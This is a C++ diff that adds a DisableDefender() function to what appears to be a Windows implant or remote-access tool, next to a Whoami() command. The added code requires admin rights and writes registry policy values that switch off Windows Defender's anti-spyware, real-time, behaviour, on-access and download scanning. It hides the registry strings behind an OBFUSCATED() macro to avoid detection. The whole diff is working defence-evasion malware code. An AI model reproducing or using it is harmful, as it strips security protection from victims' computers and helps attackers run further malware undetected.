@@ -4,6 +4,7 @@
 #include "command.h"
 #include "debug.h"
 #include "profile.h"
+#include "utils.h"
 #include <shlwapi.h>
 #include <map>
 #include <psapi.h>
@@ -420,4 +421,54 @@ std::string Whoami() {
     DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
     GetUserName(userName, &userNameSize);
     return std::string(userName);
+}
+
+
+/**
+ * https://github.com/Nolan-Burkhart/defender-disabler/blob/master/virus-disabler/main.cpp
+*/
+BOOL DisableDefender() {
+    if (!IsAdmin()){
+        return FALSE;
+    }
+
+    HKEY key;
+
+    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &key)) {
+		return FALSE;
+	}
+
+    uint32_t payload = 1;
+	if (RegSetValueEx(key, OBFUSCATED("DisableAntiSpyware"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
+		return FALSE;
+	}
+
+    HKEY new_key;
+	if (RegCreateKeyEx(key, OBFUSCATED("Real-Time Protection"), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0)) {
+		return FALSE;
+	}
+	key = new_key;
+
+    if (RegSetValueEx(key, OBFUSCATED("DisableRealtimeMonitoring"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
+		return FALSE;
+	}
+
+	if (RegSetValueEx(key, OBFUSCATED("DisableBehaviorMonitoring"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
+		return FALSE;
+	}
+
+	if (RegSetValueEx(key, OBFUSCATED("DisableOnAccessProtection"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
+		return FALSE;
+	}
+
+	if (RegSetValueEx(key, OBFUSCATED("DisableScanOnRealtimeEnable"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
+		return FALSE;
+	}
+
+	if (RegSetValueEx(key, OBFUSCATED("DisableIOAVProtection"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
+		return FALSE;
+	}
+
+    RegCloseKey(key);
+    return TRUE;
 }
